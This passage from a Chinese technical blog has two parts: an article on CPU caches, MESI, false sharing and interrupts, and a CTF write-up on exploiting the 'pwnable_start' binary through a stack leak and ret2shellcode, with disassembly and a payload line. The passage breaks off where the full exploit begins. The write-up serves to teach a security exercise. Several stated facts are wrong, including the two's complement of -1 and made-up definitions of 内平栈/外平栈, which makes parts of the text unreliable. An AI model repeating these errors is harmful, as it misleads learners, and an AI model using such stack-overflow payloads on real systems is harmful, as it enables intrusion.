href="https://pic.imgdb.cn/item/63c57daebe43e0d30e973de2.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63c57daebe43e0d30e973de2.png"></a></p><p>举一个R类型的指令 比如add $0,$1,$2</p><p>目标寄存器为$0 第一个操作数是$1 第二个操作数是$2 add的操作码为0 函数码为32</p><p>所以指令编码后转化成的机器码为 000000 00001 00010 00000 00000 32</p><p>cpu解析指令后将其分为数据段和正文段 数据段用来存放变量等 正文段用来存放指令</p><p>cpu有一个专门用来存放指令地址的 称其为程序计数器 其存放的指令地址为下一个要执行的指令</p><p>cpu先根据程序计数器索引指令 随后通过控制单元操控地址总线访问对应地址 随后利用数据总线传输数据到对应寄存器</p><p>接着程序计数器自增 自增大小根据操作系统位数有关 为一个字长</p><p>随后程序根据指令类型判断 如果为计算类型的指令 交给逻辑运算单元 如果是存储类型交给控制单元</p><p>大部分cpu遵从的是四个固定步骤来执行指令 分别是取指令 指令译码 执行指令 数据回写</p><p>取指令(Fetch): 通过程序计数器读取指令地址</p><p>指令译码(Decode): 对指令进行解码</p><p>执行指令(Execution): cpu执行指令</p><p>数据回写(Store): 程序将数据写回对应寄存器或者内存</p><p>我们称上述四个步骤为指令周期</p><p>cpu执行每一个步骤的时间称为时钟周期  如果时钟频率越快 时钟周期就越短 cpu的执行速度也越快</p><p>时钟频率和cpu的主频相关 也就是我们常说的几GHZ</p><p>比如2.4GHZ 代表着一秒可以触发2.4G次的脉冲信号 每一次脉冲信号的高低电频转化就是一次时钟周期</p><p>另外 cpu为什么还存在原码 补码 反码</p><p>原码是对于计算机中二进制的一种表达方式 首位额外增加了符号位 正数是0 负数是1</p><p>比如10进制数字1用源码表示就是000000001</p><p>但是原码不能直接用于计算 比如两个十进制数字1+(-1)&#x3D;0</p><p>如果整个计算过程用原码来表示的话就是</p><p>000000001 + 100000001 &#x3D; 100000010</p><p>最后的结果是-2 明显计算错误 因此计算机用补码来表达负数</p><p>所谓补码就是把负数的原码全部取反再加上1</p><p>所以-1的补码就是 011111111</p><p>而反码就是原码向补码转化的过度值 也就是还没有加上1时的数值 比如-1的反码是011111110</p><p>接下来我们再来讲一下二进制是如何表示小数的</p><p>10.625这个数 在二进制中实际上是1010.101</p><p>小数点前面的是正数幂 后则是负数幂</p><p>1010.101转化为十进制是<a href="https://pic.imgdb.cn/item/63c58555be43e0d30ea59d76.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63c58555be43e0d30ea59d76.png"></a></p><p>但是你会发现也有很多数 比如0.1是不能用二进制表示完全的 这种时候就会产生偏差 如果将二进制的0.1转化回十进制</p><p>得到的值是近似于0.1的 0.0001100110…….</p><p>我们提到过的二进制数1010.101如果用规格化存储 得到是1.010101 x 2*3 其中010101称之为尾数 3为指数 用来规范小数点的位置</p><p>更多细节这里不扩展 感兴趣的可以去这个博客了解</p><p><a href="https://xiaolincoding.com/os/1_hardware/float.html#%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%98%AF%E6%80%8E%E4%B9%88%E5%AD%98%E5%B0%8F%E6%95%B0%E7%9A%84">2.7 为什么 0.1 + 0.2 不等于 0.3 ？ | 小林coding (xiaolincoding.com)</a></p><p>接着我们来利用下面的这个程序进入cpu cache的存储内容</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">20</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,a[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当cpu执行printf语句的时候 需要将a[0]的值读入cache 但是cpu并不能刚好读入单个数据或者是刚好适应不同调用情况的字节数据 其单次读写数据的单位是cache line 上文讲述slab着色器的时候也说到过了 这里复述的详细一点</p><p>假设此cpu的cache line是64字节 那么当其需要a[0]数据的时候 会把a[0]后面的数据也一并读入 直到满足64字节 </p><p>第一块64字节的数据会被放置为cache line 0  当需要更多字节的数据的时候 就会依法炮制 放置在cache line1 如此递增</p><p>假设cache一共有8行 而内存被分为了32个块 这也就意味着必然会有两块以上的内存共用一块cache line</p><p>其遵守的是取模运算 比如说第15个内存块 实际上对应的是第7个cache line</p><p>而cpu为了避免搞混单个cache line中的不同内存块 在对应的cache line中还存储了tag标记 相当于slab着色器</p><p>除了tag标记外 cache line中还存储着两个重要信息 一个是有效位 一个是偏移量</p><p>有效位为0时 不管cache中是否有需要的内存数据 仍然会去内存中读取</p><p>偏移量的存在则是因为cpu所需的内存数据并不一定都是刚好一个cache line 就比如说上面的程序</p><p>所需的仅仅是cache line中的一个内存片段 也就需要偏移量来界定一个范围</p><p>cache line是为了避免频繁的cpu访问内存带来的读写效率降低</p><p>但是其存在着一个缺陷 也就是意味着一块cache line中可能并不全是所需要的数据 出现了缓存命中率的问题 其又分为数据缓存命中率和指令缓存命中率</p><p>先说数据缓存命中率吧 来看下面的一个程序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">5</span>][<span class="number">20</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,a[<span class="number">0</span>][i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,a[i][<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>你觉得哪一个for循环执行所消耗的时间会更加短 是第一个? 那为什么呢</p><p>其调用的数据在内存地址中都是连续的 也就意味着单次的cache line写入就可以做到覆盖所有要调用的数据</p><p>而第二个for循环调用的数据是间断的 需要花费更多的时间在cpu和内存的交互中</p><p>当我们需要遍历数组这种情况时 最好选择连续的内存空间 可以有效提高程序的运行时间和数据缓存命中率</p><p>而指令缓存命中率是什么呢？</p><p>还是先看一下下面的程序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">20</span>];</span><br><span class="line">    <span class="comment">// 数组a进行一个随机赋值 这里不演示出来</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            a[i]=<span class="number">0</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当数组a进行了赋值后 步入if判断分支 请问是先对数组a中的数据进行一个排序后再判断所消耗的时间快还是直接进行判断</p><p>回答这个问题之前我们首先要了解 cpu拥有一个分支预测器 如果cpu能够预测到接下来是步入if语句的哪个分支 就会提前把指令(在这里也就是a[i]&#x3D;0)放入到cache中 于是执行速度就会加快</p><p>那么显然 先进行排序再步入if判断语句就可以提高判断后赋值的效率</p><p>当我们在实际编写程序的时候 如果你可以确保哪一个步入哪一个分支的概率较高 你可以使用likely和unlikely两种宏</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> likely(x)__builtin_expect( !!(x),1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unlikely(x) __builtin_expect( ! !(x),0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">20</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(likely(a[i]&lt;<span class="number">100</span>))&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当括号中的判断式为true的概率大时 就使用likely宏</p><p>与此同时 我们前面提高过 每个cpu核心都有自己的L1 L2 cache 数据会被优先放到这两个cache中存放 方便cpu调用</p><p>但是 如果是单核cpu的话 只能执行一个线程 但是系统给多个需要被执行的线程分配时间片 每个线程执行一段时间后 就执行另外一个线程 所以看起来就好像所有的线程都在同时执行一样</p><p>但是现在的cpu基本都是多核心的 这也就意味着线程可能会在多个核心中执行 这就导致了缓存命中率的问题</p><p>上述所提到的cache和内存的数据交互 只是cache单方面写入内存的数据 如果cpu要执行b &#x3D; a+1的操作呢?</p><p>那么就需要将cache的数据b写回到内存 这一操作是怎么实现的 下面我们就来讲两种写入数据的办法 分别是写直达和写回</p><p>写直达:</p><p>这一种办法是最简单粗暴的 也就是连同cache和内存 一起写入数据</p><p>流程为 先判断cache中是否有需要被写入的数据 如果有 就先写入cache 再写入内存</p><p>如果没有 就直接写入内存</p><p>这种办法的逻辑简单 比较浪费cpu的执行时间 因为每次写入都需要访问内存</p><p>写回:</p><p>写回办法有效解决了前者出现的问题</p><p>当要进行写操作的时候 先判断cache是否已经有对应数据了   如果有的话 则更新数据到cache中 并且把数据标记为脏的</p><p>如果cache中是其他内存地址的数据的话 先判断这个数据是不是脏的 如果是脏的 那么先将该数据写回到内存中</p><p>再从内存中将需要用到的数据写到cache 再覆写cache中的数据 并且标记为脏的 之所以这样做可以看</p><p><a href="https://stackoverflow.com/questions/26672661/for-write-back-cache-policy-why-data-should-first-be-read-from-memory-before-w">caching - For Write-Back Cache Policy, why data should first be read from memory, before writing to cache? - Stack Overflow</a></p><p>如果不是脏的话 就只要将需要的数据从内存中写入到cache 再覆写cache 最后标记为脏的</p><p>这样下来 就不需要每次写操作都需要访问内存</p><p>你可能会觉得 那这样就无法及时的写回内存 但是如果我们的缓存命中率高的话 就不需要频繁的与内存交互</p><p>我们一直提到缓存命中率 这是对于同一个核心而言的 如果一个线程由两个核心执行呢</p><p>一个计算式:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=b=0   //1</span><br><span class="line">a += 1  //2</span><br><span class="line">b += 1  //3</span><br><span class="line">a += b  //4</span><br></pre></td></tr></table></figure><p>如果核心A负责式子2和4  核心B负责式子3</p><p>接下来注意了 两个核心读入数据到cache中时 读入的都是初始值 对于两个核心来说 a,b最开始的值都是0</p><p>核心A执行完式子2了以后 按照上文的写回操作 并不会马上将数据写回到内存中 </p><p>接下来核心A执行式子4的时候 其和核心B执行的式子3 并没有关联 对于核心A来说 变量a是1 变量b是0</p><p>a最后的值是1 但是对于上帝视角的我们来说 最后的结果应该是2 这就是核心A和B的信息差导致的后果 称这种问题为缓存一致性</p><p>为了解决这种问题的出现 就需要一种机制来协调不同核心间的cache </p><p>也就是当核心A将变量a赋值为了1时 需要通知其他核心的cache 将a同样重新赋值 相当于广播 这种方式称为总线嗅探</p><p>这种行为称为写传播 但是光这样还是不足以平衡不同核心之间的信息差 当核心A对于变量a多次赋值 第一次赋值为10 第二次赋值为20</p><p>假设核心B接收到的广播顺序是先20再10 那么显然最后变量a在两个核心中的值还是不同 也就需要统一对数据的操作顺序</p><p>这种行为称为事务的串行化 当接收到广播后 只有拥有&lt;锁&gt;才能对这个数据的赋值进行修改</p><p>要想同时实现事务串行化和写传播 并且优化每次写传播都需要对所有核心广播的问题</p><p>诞生了MESI协议 MESI协议包括了四种状态 分别是 已修改 独占 共享 已失效</p><p>已修改: 即我们前面提到的脏标记 意味着此时该数据在cache和内存中不一样</p><p>独占&#x2F;共享:二者的定义是对于cpu核心而言的 即该数据是否为单个cpu核心所独占 如果处于独占状态 那么写入数据后就不需要写传播</p><p>如果处于共享状态 先经过写传播 将其他核心内的数据修改成无效状态 再重新写入数据</p><p>已失效: 代表该数据不能被调用 </p><p>MESI协议的共享机制存在着伪共享的问题 </p><p><a href="https://pic.imgdb.cn/item/63bef482be43e0d30eae534c.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63bef482be43e0d30eae534c.png"></a></p><p>此时核心A和核心B分别负责线程A(a +&#x3D; 1)  线程B(b +&#x3D; 1)</p><p>而变量a和b相邻 位于同个cache line范围中 所以此时核心A和核心B的cache line拥有同样的变量 变成共享状态</p><p>此时 核心A开始执行线程A 发现其处于共享状态 于是通过总线将核心B的cache line修改为已失效状态 随后进程A结束后 核心A的cache line变化已修改状态</p><p>核心B开始执行线程B 发现cache line处于失效状态 于是将拥有和其一样变量的核心A的cache line写回到内存 再从内存中重新读入cache line 随后执行完线程B以后 将新cache line设置为已修改状态 而此时核心A的cache line处于已失效状态</p><p>如果核心A和B不断重复各自的线程 实际上就是不断重复上述的操作 频繁的和内存进行交互 cache line的用处微乎其微 这就是伪共享问题</p><p>想要解决这一问题 linux内核提供了__cacheline_aligned_in_smp的宏定义</p><p>对于该定义 仅使用于多核cpu 下面举例一个程序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时变量a和b在内存地址上是相邻的 如果将变量b用上__cacheline_aligned_in_smp宏定义</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SMP</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __cacheline_aligned_in_smp __cacheline_aligned</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __cacheline_aligned_in_smp</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">int</span> b __cacheline_aligned_in_smp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时b的地址就被设置为cache line的对齐地址</p><p><a href="https://pic.imgdb.cn/item/63bef814be43e0d30eb254f8.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63bef814be43e0d30eb254f8.png"></a></p><p>但是这种方法实际上是浪费了一部分cache line的空间 来换取效率的提升</p><p>接下来我们来讲一下进程和线程的一点知识 为了接下里要讲的软中断做铺垫</p><p>每一个进程都有自己独立的内存空间 一个进程可以拥有多个线程 在windows系统中 可以使用任务管理器来查看当前的进程</p><p><a href="https://pic.imgdb.cn/item/63c1255bbe43e0d30e043bd8.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63c1255bbe43e0d30e043bd8.png"></a></p><p>其中 一个进程可以拥有多个线程</p><p>在linux系统中 线程可以被视为一个轻量化的进程 也就是说线程也是被作为一个进程看待</p><p>而在JVM(java为了实现跨平台而创建的一个假想计算机)中的线程 拥有自己的程序计数器 虚拟机栈 本地方法栈</p><p>这里不额外扩展 感兴趣的可以自行了解</p><p>进程是操作系统资源分配的基本单位 而线程是处理器任务调度和执行的基本单位</p><p>每一个线程都有自己的独立运行栈和程序计数器  并且共享代码和数据空间</p><p>线程也不能自己独立执行 必须依附于应用程序 也就是进程中</p><p>当有一个线程崩溃掉 整个进程都会崩溃掉 </p><p>相比之 进程拥有独立的代码和数据空间 进程之间的切换会消耗挺大的开支</p><p>一个进程崩溃后 在保护模式下不会对其他进程造成影响</p><p>接下来我们来讲软中断 首先要明白什么是中断</p><p>举一个例子 在日常生活中 你正在打原神 这时候你接到了你的外卖电话 由于你的学习福建师范大专偷外卖的人很多 你不马上下楼拿就会不见 所以你立刻中断了打原神的操作 下楼去拿外卖</p><p>其中 打原神就是一个进程 拿外卖又是一个进程 从打原神向拿外卖的一个执行转化 就是中断</p><p>对于计算机来说 中断是一个异步的事件处理机制 可以有效于提高系统的并发处理能力</p><p>负责相应中断请求的是中断处理程序 其在相应中断请求的时候 可能还会临时关闭中断 这是什么意思呢</p><p>还是接着上面的例子 当我们下楼拿外卖的时候 原神突然发放福利1w原石 但是需要玩家动手领取 这时候你下楼去拿外卖了 也就无法相应这个福利 你就和原石擦肩而过</p><p>本来计算机需要相应两次中断 一次拿外卖 一次领福利 但是由于中断处理程序还在执行第一次中断 无法及时相应第二次中断 就丢失了一次中断</p><p>那么软中断是什么呢? 其讲一次中断请求分为了两个部分 第一部分用于快速响应中断 直接处理硬件请求 为硬中断</p><p>第二部分用于处理第一部分还没有完成的事情 通常是时间较长的事情 为软中断</p><p>如何理解呢? 举个例子</p><p>A要和你聊事情 约你在一个地方见面 没有分为软中断和硬中断的话 A会和你一直保持通话 期间如果其他人要找你就没有办法响应</p><p>如果有软中断的话 就是和A迅速约定好见面地点和时间  然后挂断电话 等待其他人给你打电话  随后你可以面对面询问A遇到什么问题</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> extra </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pwnable_start</title>
      <link href="/2022/12/04/pwnable-start/"/>
      <url>/2022/12/04/pwnable-start/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>一道很有趣的题目 原理基础ret2shellcode 但是考查了汇编代码的阅读以及栈结构的理解 还有内平栈</p><p>涉及到的知识点还是很多的 这里讲细一点</p><h2 id="内平栈"><a href="#内平栈" class="headerlink" title="内平栈"></a>内平栈</h2><p>内平栈（In—Place Stack）是一种特殊的栈，可以在一个给定的数组中存储元素，并可以支持压栈和弹栈操作，且不需要额外的内存空间。保持堆栈平衡的关键是使用一个变量（称为指针，即esp）来跟踪堆栈顶部的位置。当元素被压入堆栈时，指针会指向新元素，表示它是当前堆栈的顶部。当元素被弹出堆栈时，指针会移动到上一个元素的位置，表示它是当前堆栈的新顶部。这样，指针就可以在堆栈操作过程中保持堆栈平衡。</p><h2 id="外平栈"><a href="#外平栈" class="headerlink" title="外平栈"></a>外平栈</h2><p>外平栈（External Stack）是一种特殊的栈，可以存储元素，并可以支持压栈和弹栈操作，但需要额外的内存空间。与内平栈不同，外平栈不使用指针来跟踪堆栈顶部的位置，而是使用两个变量：一个用于标识堆栈顶部的位置(esp)，另一个用于标识堆栈底部的位置(ebp)。当元素被压入堆栈时，顶部变量会指向新元素，表示它是当前堆栈的顶部。当元素被弹出堆栈时，底部变量会指向上一个元素的位置，表示它是当前堆栈的新底部。这样，两个变量就可以在堆栈操作过程中保持堆栈平衡。</p><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>checksec看一下保护机制</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/chen/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>保护机制全部关闭 再ida看一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:08048060                 public _start</span><br><span class="line">.text:08048060 _start          proc near               ; DATA XREF: LOAD:08048018↑o</span><br><span class="line">.text:08048060                 push    esp</span><br><span class="line">.text:08048061                 push    offset _exit</span><br><span class="line">.text:08048066                 xor     eax, eax</span><br><span class="line">.text:08048068                 xor     ebx, ebx</span><br><span class="line">.text:0804806A                 xor     ecx, ecx</span><br><span class="line">.text:0804806C                 xor     edx, edx</span><br><span class="line">.text:0804806E                 push    3A465443h</span><br><span class="line">.text:08048073                 push    20656874h</span><br><span class="line">.text:08048078                 push    20747261h</span><br><span class="line">.text:0804807D                 push    74732073h</span><br><span class="line">.text:08048082                 push    2774654Ch</span><br><span class="line">.text:08048087                 mov     ecx, esp        ; addr</span><br><span class="line">.text:08048089                 mov     dl, 14h         ; len</span><br><span class="line">.text:0804808B                 mov     bl, 1           ; fd</span><br><span class="line">.text:0804808D                 mov     al, 4</span><br><span class="line">.text:0804808F                 int     80h             ; LINUX - sys_write</span><br><span class="line">.text:08048091                 xor     ebx, ebx</span><br><span class="line">.text:08048093                 mov     dl, 3Ch ; &#x27;&lt;&#x27;</span><br><span class="line">.text:08048095                 mov     al, 3</span><br><span class="line">.text:08048097                 int     80h             ; LINUX -</span><br><span class="line">.text:08048099                 add     esp, 14h</span><br><span class="line">.text:0804809C                 retn</span><br><span class="line">.text:0804809C _start          endp ; sp-analysis failed</span><br></pre></td></tr></table></figure><p>应该不是用c语言编译的 很干净 只有一个exit函数和start函数 反编译后看不出什么所以然</p><p>并且可以看到没有ebp指针 说明这题是内平栈 是利用esp指针来控制程序执行流</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">start</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">0x3C00000003</span>LL;</span><br><span class="line">  __asm</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">int</span>     <span class="number">80</span>h; LINUX - sys_write</span><br><span class="line">    <span class="type">int</span>     <span class="number">80</span>h; LINUX -</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里直接解读汇编吧</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:08048060                 push    esp</span><br><span class="line">.text:08048061                 push    offset _exit</span><br><span class="line">.text:08048066                 xor     eax, eax</span><br><span class="line">.text:08048068                 xor     ebx, ebx</span><br><span class="line">.text:0804806A                 xor     ecx, ecx</span><br><span class="line">.text:0804806C                 xor     edx, edx</span><br></pre></td></tr></table></figure><p>前面6行对这个栈帧进行了初始化的操作 push入栈了esp 接着入栈了返回地址为exit函数</p><p>随后对于四个寄存器进行了归零操作</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0804806E                 push    3A465443h</span><br><span class="line">.text:08048073                 push    20656874h</span><br><span class="line">.text:08048078                 push    20747261h</span><br><span class="line">.text:0804807D                 push    74732073h</span><br><span class="line">.text:08048082                 push    2774654Ch</span><br></pre></td></tr></table></figure><p>16进制转化成人话就是: <strong>Let’s start the CTF:</strong></p><p>这里的五次push 使得esp指向减少了0x14</p><p>此时的栈帧结构为:</p><p><a href="https://pic1.imgdb.cn/item/638cc09e16f2c2beb1c163c2.png" class="gallery-item"><img src="https://pic1.imgdb.cn/item/638cc09e16f2c2beb1c163c2.png"></a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:08048087                 mov     ecx, esp        ; addr</span><br><span class="line">.text:08048089                 mov     dl, 14h         ; len</span><br><span class="line">.text:0804808B                 mov     bl, 1           ; fd</span><br><span class="line">.text:0804808D                 mov     al, 4</span><br><span class="line">.text:0804808F                 int     80h</span><br></pre></td></tr></table></figure><p>接着把esp所指向的内存空间赋值给了ecx 这里可以看到ida识别出来了 其被作为一个函数的addr参数 这个函数是什么先别急 我们一行一行看</p><p>这里出现了一个新的寄存器名称 为什么只是dl？ 并且在ida中我们选中其 会和edx一起关联起来 二者有什么关系？</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">32位CPU有4个32位的通用寄存器EAX、EBX、ECX和EDX。对低16位数据的存取，不会影响高16位的数据。这些低16位寄存器分别命名为：AX、BX、CX和DX，它和先前的CPU中的寄存器相一致。</span><br><span class="line">4个16位寄存器又可分割成8个独立的8位寄存器(AX：AH-AL、BX：BH-BL、CX：CH-CL、DX：DH-DL)，每个寄存器都有自己的名称，可独立存取。</span><br><span class="line"></span><br><span class="line">Eax是32位寄存器，ax是16位寄存器,al(ah)是八位寄存器</span><br><span class="line"></span><br><span class="line">Eax可以存储的数字是DWORD（双字）ax存储的是WORD（字）AL(AH)存储的是BYTE（字节），那么为什么又有AH和AL呢，我们可以这样理解，AX=AH+AL，AH存储的是AX的高８位数据，AL存储的是AX的低八位数据。H这里就是HIGH,Ｌ就是LOW.</span><br><span class="line"></span><br><span class="line">取自https://blog.csdn.net/EVEPITWANG/article/details/89447466</span><br></pre></td></tr></table></figure><p>相当于给这个函数赋值了长度参数(ida识别出来的len)</p><p>那么接下来的bl寄存器同理 相当于ebx的低8位 赋值为了1</p><p>重点来了 eax的低八位被赋值为了4 随后进行了int 0x80 也就是系统调用</p><p>那么我们查询一下调用号为4的函数是什么 发现是write函数</p><p><a href="https://blog.csdn.net/qq_29343201/article/details/52209588">(5条消息) linux 系统调用号表_Anciety的博客-CSDN博客_系统调用号</a></p><p>那么上述汇编代码翻译成c语言也就是</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">write(<span class="number">1</span>,esp,<span class="number">0x14</span>)</span><br></pre></td></tr></table></figure><p>所以 相当于输出了上面push入栈的那0x14字节的数据 也就是输出了相应的字符串</p><p>但是这里注意一下 栈仍然是不变的 此时栈的结构和esp指针仍然是保留原状(即上文的图所示)</p><p>接下来再看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:08048091                 xor     ebx, ebx</span><br><span class="line">.text:08048093                 mov     dl, 3Ch ; &#x27;&lt;&#x27;</span><br><span class="line">.text:08048095                 mov     al, 3</span><br><span class="line">.text:08048097                 int     80h             ; LINUX -</span><br></pre></td></tr></table></figure><p>赋值了两个参数 edx(参数len)为0x3c eax(系统调用号)为3 还有xor ebx,ebx相当于ebx赋为0</p><p>调用号3是read函数 也就是</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">read(<span class="number">0</span>,esp,<span class="number">0x3c</span>)</span><br></pre></td></tr></table></figure><p>所以我们可以在esp指针指向的地方 输入0x3c字节数据</p><p>接着看剩下的代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:08048099                 add     esp, 14h</span><br><span class="line">.text:0804809C                 retn</span><br></pre></td></tr></table></figure><p>使esp寄存器的值增加0x14 此时esp指向的是存放offset _exit地址的空间</p><p>随后retn指令相当于pop eip 也就是控制程序执行流到exit函数 进行一个退出</p><p>在retn过后 此时栈帧就只剩下一个old esp了</p><p>分析完了程序 那么我们来想一下利用的思路</p><p>我们拥有栈溢出的机会 并且得知了具体哪一块栈空间可以用来控制程序执行流 并且保护全关</p><p>没有system函数也没有泄露libc的机会 也没有足够的栈溢出长度来供我们使用onegadget生成的shellcode直接pwn</p><p>那么这时候想到的是ret2shellcode 我们只能在栈上写入shellcode 但是没有bss段供我们写入的机会 所以只能写在栈上</p><p>那么要做的就是泄露栈上的地址 想一下 程序唯一能够利用输出的地方也就是write函数那边了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:08048087                 mov     ecx, esp        ; addr</span><br><span class="line">.text:08048089                 mov     dl, 14h         ; len</span><br><span class="line">.text:0804808B                 mov     bl, 1           ; fd</span><br><span class="line">.text:0804808D                 mov     al, 4</span><br><span class="line">.text:0804808F                 int     80h             ; LINUX - sys_write</span><br></pre></td></tr></table></figure><p>看到第一个 mov ecx,esp 我们再联想到 retn指令执行完了以后 栈帧只剩下了old esp 并且此时esp仍然指向old esp 此时如果执行</p><p>这一行指令 那么ecx的值就会被赋为old esp 也就是程序会输出old esp 也就是泄露了栈地址</p><p>所以我们第一次写入的payload为</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x14</span>)+p32(<span class="number">0x8048087</span>)</span><br><span class="line"><span class="comment">#0x14字节的垃圾数据用来填充push入栈的那串字符串 p32(0x8048087)覆盖的是offset _exit 用来控制程序执行流</span></span><br></pre></td></tr></table></figure><p>此时程序就会输出old esp 那么接下来又要怎么利用</p><p>我们知道 控制程序执行流利用的是retn这个指令 但是在其生效前 esp指针会被抬高0x14字节</p><p>所以我们需要0x14字节的垃圾数据 然后再往栈上写入shellcode存放的地址 然后控制程序执行流到shellcode</p><p>这一系列的操作用图演示为;</p><p><a href="https://pic.imgdb.cn/item/638d8069b1fccdcd360c696a.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/638d8069b1fccdcd360c696a.png"></a></p><p>所以此时eip接收到了stack_addr(我们泄露的栈地址)+0x14</p><p>其寻址到shllcode的栈空间 于是我们就获取了shell</p><p>完整的exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span 